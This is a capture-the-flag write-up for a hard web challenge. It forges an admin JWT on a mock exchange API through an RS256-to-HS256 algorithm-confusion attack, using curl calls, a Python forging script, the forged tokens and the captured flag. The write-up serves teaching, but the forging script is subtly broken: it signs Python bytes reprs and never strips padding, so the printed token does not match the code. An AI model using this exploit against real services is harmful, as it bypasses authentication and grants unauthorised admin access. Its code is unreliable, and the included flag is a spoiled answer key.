---
title: reto05
challenge_type: Web
difficulty: Hard
author: "@lassault"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: CryptoX uses a token-based authentication scheme to protect its endpoints. Explore the API and find a way to access the restricted area.
connections:
  - url: http://nct25.thehackerconclave.es:26005
---

## Recon

This appears to be a straightforward cryptocurrency exchange platform.

![Landing page](/assets/files/navarra-cyber-talent-25-4/reto05/website.png)

The **API Docs** URL displays an OpenAPI schema listing all available API routes. There are four interesting routes:

1. `POST /api/token`: Obtain a JWT token.
2. `GET /api/me`: Retrieve the current user's information.
3. `GET /api/admin/flag`: Access the flag (admin only).
4. `GET /public.pem`: Download the RSA public key used for JWT verification.

Let's attempt to authenticate and retrieve the flag:

```bash
$ curl -s -X POST http://nct25.thehackerconclave.es:26005/api/token -d '{"username":"alice"}' | jq .
{
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzYyMDc4NTAxLCJleHAiOjE3NjIwNzk0MDEsImlzcyI6ImNyeXB0b3giLCJhdWQiOiJhcGktY2xpZW50cyJ9.SjAmXSsWtxdhIg583IUAYfbf93h1VoWxrgbkZs3xm17ga4z9cgxPRjyrKq9iP9Mvizu1yumUUMFqv_CO3t1E7RjLNizmOi9v4J8PQCWMNMk72-YOUQmTsr2SN4Ia3qG-TnXT0fmSteFA1g-_D-U18qdk9aPmsOAyen1cClAwDbyXaQZz_7QvNQWl4xmWLI_61xeTLSb2jaxxoG5ZE6IcvG83pRa8HL0a-ZSgcoatmOUQWdUHos1k23C57pZ4lFGUcojc4XGtXfqFOLzQEPN7uPtiOTK06BVj_TQzhs2beRQ_1llnlKAYYmrTvVVUsRTBBrDpsZBgv-4Qynq0UjQFNQ",
  "token_type": "Bearer",
  "expires_in": 900
}
```

```bash
$ curl -s http://nct25.thehackerconclave.es:26005/api/me \
    -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzYyMDc4NTAxLCJleHAiOjE3NjIwNzk0MDEsImlzcyI6ImNyeXB0b3giLCJhdWQiOiJhcGktY2xpZW50cyJ9.SjAmXSsWtxdhIg583IUAYfbf93h1VoWxrgbkZs3xm17ga4z9cgxPRjyrKq9iP9Mvizu1yumUUMFqv_CO3t1E7RjLNizmOi9v4J8PQCWMNMk72-YOUQmTsr2SN4Ia3qG-TnXT0fmSteFA1g-_D-U18qdk9aPmsOAyen1cClAwDbyXaQZz_7QvNQWl4xmWLI_61xeTLSb2jaxxoG5ZE6IcvG83pRa8HL0a-ZSgcoatmOUQWdUHos1k23C57pZ4lFGUcojc4XGtXfqFOLzQEPN7uPtiOTK06BVj_TQzhs2beRQ_1llnlKAYYmrTvVVUsRTBBrDpsZBgv-4Qynq0UjQFNQ" | jq .
{
  "user": {
    "name": "alice",
    "role": "user"
  }
}
```

```bash
$ curl -s http://nct25.thehackerconclave.es:26005/api/admin/flag \
    -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzYyMDc4NTAxLCJleHAiOjE3NjIwNzk0MDEsImlzcyI6ImNyeXB0b3giLCJhdWQiOiJhcGktY2xpZW50cyJ9.SjAmXSsWtxdhIg583IUAYfbf93h1VoWxrgbkZs3xm17ga4z9cgxPRjyrKq9iP9Mvizu1yumUUMFqv_CO3t1E7RjLNizmOi9v4J8PQCWMNMk72-YOUQmTsr2SN4Ia3qG-TnXT0fmSteFA1g-_D-U18qdk9aPmsOAyen1cClAwDbyXaQZz_7QvNQWl4xmWLI_61xeTLSb2jaxxoG5ZE6IcvG83pRa8HL0a-ZSgcoatmOUQWdUHos1k23C57pZ4lFGUcojc4XGtXfqFOLzQEPN7uPtiOTK06BVj_TQzhs2beRQ_1llnlKAYYmrTvVVUsRTBBrDpsZBgv-4Qynq0UjQFNQ"
{"error":"Forbidden"}
```

We are not authorized to access the flag endpoint. Since the path contains the word `admin` and our current authentication shows `"role": "user"`, we need to find a way to elevate our role to administrator in order to gain access.

Let's examine the authentication JWT token. For this, we can use [JWT.io](https://jwt.io):

![Decoded JWT token](/assets/files/navarra-cyber-talent-25-4/reto05/jwt.png)

We cannot directly forge a valid JWT token, as it uses the `RS256` algorithm for signature verification and we only have access to the RSA public key, not the private key. However, this scenario points to the possibility of exploiting a **JWT Algorithm Confusion Attack**.

## Exploitation

We can try modifying the token's algorithm from `RS256` to `HS256`, which is a symmetric signing algorithm. By using the public key as the secret to sign the token, we may successfully forge a valid signature if the server is improperly configured to accept this change.

Let's create a simple Python script to forge a new token:

```python
import base64, hashlib, hmac, json, requests, time

public_key = requests.get("http://nct25.thehackerconclave.es:26005/public.pem").text
public_key = public_key.encode()

b64 = lambda x: base64.urlsafe_b64encode(x if isinstance(x, bytes) else x.encode()).rstrip(b'=').decode()

now = int(time.time())

header = base64.urlsafe_b64encode(json.dumps({
    "alg": "HS256",
    "typ": "JWT"
}).encode())

payload = base64.urlsafe_b64encode(json.dumps({
    "sub": "alice",
    "role": "admin",
    "iat": now,
    "exp": now+900,
    "iss": "cryptox",
    "aud": "api-clients"
}).encode())

signature = base64.urlsafe_b64encode(
    hmac.new(public_key, f"{header}.{payload}".encode(), hashlib.sha256).digest()
)

print(f"{header.decode()}.{payload.decode()}.{signature.decode()}")
```

```bash
$ python3 craft_jwt.py
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJhZG1pbiIsICJpYXQiOiAxNzYyMDgwMDY0LCAiZXhwIjogMTc2MjA4MDk2NCwgImlzcyI6ICJjcnlwdG94IiwgImF1ZCI6ICJhcGktY2xpZW50cyJ9.B0QvVrNr5TlyrohkP8h9Nnlybh_WdkpclZwdRjTtuU4
```

Let’s query the `/api/me` endpoint again to confirm that we have successfully obtained admin privileges:

```bash
$ curl -s http://nct25.thehackerconclave.es:26005/api/me \
    -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJhZG1pbiIsICJpYXQiOiAxNzYyMDgwMDY0LCAiZXhwIjogMTc2MjA4MDk2NCwgImlzcyI6ICJjcnlwdG94IiwgImF1ZCI6ICJhcGktY2xpZW50cyJ9.B0QvVrNr5TlyrohkP8h9Nnlybh_WdkpclZwdRjTtuU4" | jq .
{
  "user": {
    "name": "alice",
    "role": "admin"
  }
}
```

## Flag capture

Now that we have obtained admin privileges, we should be able to successfully access the flag endpoint:

```bash
$ curl -s http://nct25.thehackerconclave.es:26005/api/admin/flag \
    -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJhZG1pbiIsICJpYXQiOiAxNzYyMDgwMDY0LCAiZXhwIjogMTc2MjA4MDk2NCwgImlzcyI6ICJjcnlwdG94IiwgImF1ZCI6ICJhcGktY2xpZW50cyJ9.B0QvVrNr5TlyrohkP8h9Nnlybh_WdkpclZwdRjTtuU4" | jq .
{
  "flag": "conclave{99fbf5e9a032314fd2257b31f5d58af5}"
}
```